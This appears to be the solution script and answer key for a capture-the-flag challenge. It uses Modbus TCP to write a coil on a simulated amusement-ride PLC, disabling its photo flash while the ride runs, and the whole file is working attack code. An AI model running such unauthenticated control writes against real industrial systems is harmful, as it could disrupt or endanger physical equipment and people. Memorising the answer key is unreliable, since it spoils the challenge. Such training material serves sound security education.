#!/usr/bin/env python3
"""
CTF Challenge 1: Lights Out
Difficulty: Easy
Points: 100

Objective: Disable the photo flash event while the ride is running

Solution:
- Event 4 (Photo Flash) enable is coil 11
- Set it to FALSE (0) to disable the flash
- Hold for 3+ seconds while ride is in RUNNING state
- The web interface will detect this and award the flag
"""

import sys
import time
from pymodbus.client import ModbusTcpClient

def main():
    if len(sys.argv) < 2:
        print("Usage: python3 challenge_01_lights_out.py <PLC_IP> [PORT]")
        print("Example: python3 challenge_01_lights_out.py 134.199.202.235 502")
        sys.exit(1)

    plc_ip = sys.argv[1]
    plc_port = int(sys.argv[2]) if len(sys.argv) > 2 else 502

    print(f"[*] CTF Challenge 1: Lights Out")
    print(f"[*] Connecting to PLC at {plc_ip}:{plc_port}")

    client = ModbusTcpClient(plc_ip, port=plc_port)
    
    if not client.connect():
        print("[!] Failed to connect to PLC")
        sys.exit(1)

    print("[+] Connected successfully")

    # Check if ride is running
    print("[*] Checking ride state...")
    state_result = client.read_holding_registers(1039, 1)  # MW15 = state
    if state_result.isError():
        print("[!] Failed to read state")
        client.close()
        sys.exit(1)

    current_state = state_result.registers[0]
    print(f"[*] Current state: {current_state} (0=IDLE, 1=STARTING, 2=RUNNING)")

    if current_state != 2:
        print("[!] Ride must be RUNNING (state=2) for this challenge")
        print("[!] Start the ride first using the HMI")
        client.close()
        sys.exit(1)

    # Read current event 4 status
    event4_result = client.read_coils(11, 1)  # event_4_enable
    if not event4_result.isError():
        print(f"[*] Event 4 current status: {event4_result.bits[0]}")

    # ATTACK: Disable Event 4 (photo flash)
    print("\n[*] Executing attack: Disabling Event 4...")
    result = client.write_coil(11, False)

    if result.isError():
        print("[!] Failed to write coil")
        client.close()
        sys.exit(1)

    print("[+] Event 4 disabled successfully!")
    print("[*] Holding for 3 seconds to complete challenge...")

    # Hold for 3 seconds
    for i in range(3):
        time.sleep(1)
        # Verify it's still disabled
        verify = client.read_coils(11, 1)
        if not verify.isError():
            status = "DISABLED" if not verify.bits[0] else "ENABLED"
            print(f"[*] Event 4 status: {status}")

    print("\n[+] Challenge condition met!")
    print("[*] Event 4 disabled while ride is running")
    print("[*] Check the web interface for flag capture notification")

    client.close()

if __name__ == "__main__":
    main()
